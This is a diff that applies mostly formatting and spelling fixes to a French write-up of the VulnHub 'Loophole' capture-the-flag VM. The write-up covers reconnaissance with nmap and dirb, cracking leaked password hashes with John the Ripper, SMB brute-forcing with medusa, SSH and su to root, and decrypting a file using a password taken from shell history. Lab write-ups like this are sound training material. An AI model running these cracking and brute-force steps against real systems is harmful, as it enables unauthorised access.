@@ -13,14 +13,14 @@ Le CTF [Loophole](http://vulnhub.com/entry/rattus_loophole,27/) propose de s'int
 
 La première difficulté de ce challenge (les mauvaises langues diront la seule), c'est de parvenir à configurer la VM car l'ISO fournit n'utilise pas DHCP et a une adresse IP statique en 10.8.7.  
 
-Finalement il faudra seulement aller dans *Fichier > Paramètres > Réseau* dans *VirtualBox* et créer un réseau privé hôte qui reprends ces infos (j'ai mis .4 et ça a marché mais dans la logique il faut sans mettre .0 si c'est pour le réseau) :  
+Finalement il faudra seulement aller dans *Fichier > Paramètres > Réseau* dans *VirtualBox* et créer un réseau privé hôte qui reprend ces infos (j'ai mis .4 et ça a marché, mais dans la logique, il faut sans mettre .0 si c'est pour le réseau) :  
 
 ![Congiguration VirtualBox](/assets/img/vboxnet0.png)
 
 Après on peut lancer Nmap pour trouver l'adresse de notre future victime :  
 
-```
-nmap -e vboxnet0 -sP 10.8.7.0/29 -T4
+```console
+$ nmap -e vboxnet0 -sP 10.8.7.0/29 -T4
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-05 09:34 CEST
 Nmap scan report for 10.8.7.2
 Host is up (0.00017s latency).
@@ -32,6 +32,7 @@ On pointe directement notre navigateur dessus et on trouve le site web de *Rattu
 
 ![Rattus Labs](/assets/img/rattus.png)
 
+```
 Nadia Vlad, CEO.  
 
 Sr. system administrator : Tom Skies - tskies@rattus.lab  
@@ -39,15 +40,16 @@ Sr. system administrator : Tom Skies - tskies@rattus.lab
 Network engineer : Jay Summer- jsummer@rattus.lab  
 
 Mark Hog - mhog@rattus.lab  
-
-Il y a aussi une page *phpinfo* publiquement accessible. La configuration est plutôt laxiste, permet l'inclusion distante par exemple. Le serveur web tourne en nobody.  
-
-Il y a un sacré nombre de modules PHP mais on verra plus tard que cette info n'est d'aucune utilité.  
-
-On lance un *dirb* sur le serveur *Apache* (1.3.31 avec PHP/4.4.4) :  
-
 ```
-> ./dirb http://10.8.7.2/ wordlists/big.txt 
+
+Il y a aussi une page `phpinfo` publiquement accessible. La configuration est plutôt laxiste, permet l'inclusion distante par exemple. Le serveur web tourne en nobody.  
+
+Il y a un sacré nombre de modules PHP, mais on verra plus tard que cette info n'est d'aucune utilité.  
+
+On lance un `dirb` sur le serveur *Apache* (1.3.31 avec PHP/4.4.4) :  
+
+```console
+$ ./dirb http://10.8.7.2/ wordlists/big.txt 
 
 -----------------
 DIRB v2.21
@@ -80,7 +82,7 @@ GENERATED WORDS: 20458
 DOWNLOADED: 20458 - FOUND: 7
 ```
 
-Surprise quand on regarde le fichier *garbage* :  
+Surprise quand on regarde le fichier `garbage` :  
 
 ```
 root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
@@ -101,7 +103,7 @@ Loaded 3 password hashes with 3 different salts (FreeBSD MD5 [128/128 AVX intrin
 mhog             (mhog)
 ```
 
-On laisse *JTR* tourner puis on passe à autre chose voir si on trouve autre chose d'intéressant. *Metasploit* a deux modules en rapport avec *mod\_negotiation* mais ils se révèlent sans intérêt dans notre cas.  
+On laisse *JTR* tourner puis on passe à autre chose voir si on trouve autre chose d'intéressant. *Metasploit* a deux modules en rapport avec `mod_negotiation` mais ils se révèlent sans intérêt dans notre cas.  
 
 On lance un scan Nmap de la cible (quand même) :  
 
@@ -147,34 +149,34 @@ HOP RTT ADDRESS
 1 0.12 ms 10.8.7.2
 ```
 
-*Metasploit* dispose de plusieurs exploits Samba mais ils sont trop vieux ou inefficaces par rapport au système.  
+*Metasploit* dispose de plusieurs exploits Samba, mais ils sont trop vieux ou inefficaces par rapport au système.  
 
 Est-ce qu'on peut faire quelque chose avec l'accès au Samba ?  
 
-```
-> nmblookup -A 10.8.7.2
+```console
+$ nmblookup -A 10.8.7.2
 Looking up status of 10.8.7.2
         LOOPHOLE        <00> -         B 
  LOOPHOLE <03> - B 
  LOOPHOLE <20> - B 
- ..\_\_MSBROWSE\_\_. <01> -  B 
+ ..__MSBROWSE__. <01> -  B 
  WORKGROUP <1d> - B 
  WORKGROUP <1e> -  B 
  WORKGROUP <00> -  B 
 
  MAC Address = 00-00-00-00-00-00
 
-> smbclient -L LOOPHOLE -N
+$ smbclient -L LOOPHOLE -N
 Anonymous login successful
 Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
-tree connect failed: NT\_STATUS\_INSUFFICIENT\_RESOURCES
+tree connect failed: NT_STATUS_INSUFFICIENT_RESOURCES
 
-> smbclient -L LOOPHOLE -U mhog%mhog
+$ smbclient -L LOOPHOLE -U mhog%mhog
 Server requested PLAINTEXT password but 'client plaintext auth = no' or 'client ntlmv2 auth = yes'
-session setup failed: NT\_STATUS\_ACCESS\_DENIED
+session setup failed: NT_STATUS_ACCESS_DENIED
 ```
 
-On rajoute quelques lignes dans la section global de notre *smb.conf* :  
+On rajoute quelques lignes dans la section `global` de notre `smb.conf` :  
 
 ```
 client lanman auth = Yes
@@ -182,20 +184,20 @@ client plaintext auth = Yes
 client ntlmv2 auth = No
 ```
 
-Le changement est pas vraiment mieux :  
+Le changement n'est pas vraiment mieux :  
 
-```
-> smbclient -L LOOPHOLE -U mhog%mhog
+```console
+$ smbclient -L LOOPHOLE -U mhog%mhog
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
 
-*Medusa* a un module SMB, on tente d'obtenir un accès (par exemple sur le compte *operator* trouvé par *dirb*) :  
+*Medusa* a un module SMB, on tente d'obtenir un accès (par exemple sur le compte `operator` trouvé par `dirb`) :  
 
-```
+```bash
 medusa -h 10.8.7.2 -u operator -P john/wordlists/password.lst -M smbnt
 ```
 
-Toujours bredouille :( On revient à nos moutons et on tente une connexion en SSH avec le compte *mhog* : et bingo ça passe !  
+Toujours bredouille :( On revient à nos moutons et on tente une connexion en SSH avec le compte `mhog` : et bingo ça passe !  
 
 ![ssh access as mhog](/assets/img/rattus2.png)
 
@@ -204,7 +206,7 @@ Cliffhanger Linux
 
 Comme d'habitude on fouille dans les processus, permissions sur les fichiers et binaires, configuration des services... rien d'intéressant.  
 
-On teste quelques exploits pour le kernel mais aucun n'aboutit. Au passage on est sur un live-CD *Slax* donc /tmp n'est pas writable (comme la plupart du FS). Ça oblige à travailler dans */dev/shm* et définir la variable d'environnement *TMPDIR* à ce répertoire pour gcc.  
+On teste quelques exploits pour le kernel mais aucun n'aboutit. Au passage, on est sur un live-CD *Slax* donc `/tmp` n'est pas writable (comme la plupart du FS). Ça oblige à travailler dans `/dev/shm` et définir la variable d'environnement `TMPDIR` à ce répertoire pour `gcc`.  
 
 On revient sur *JTR* que l'on stoppe et que l'on relance avec [une wordlist béton](http://d4n3ws.polux-hosting.com/2014/02/26/mega-wordlist/).  
 
@@ -215,17 +217,17 @@ albatros         (root)
 nostradamus      (tskies)
 ```
 
-On passe root via su et on trouve le ficier *Private.doc.enc* dans le home de l'utilisateur *tskies*.  
+On passe root via su et on trouve le fichier `Private.doc.enc` dans le home de l'utilisateur `tskies`.  
 
-On retrouve la commande de chiffrement dans son *.bash\_history* :  
+On retrouve la commande de chiffrement dans son `.bash_history` :  
 
-```
+```bash
 openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
 ```
 
 Le déchiffrement est aisé :  
 
-```
+```bash
 openssl enc -aes-256-cbc -d -in Private.doc.enc -out Private.doc -pass pass:nostradamus
 ```
 
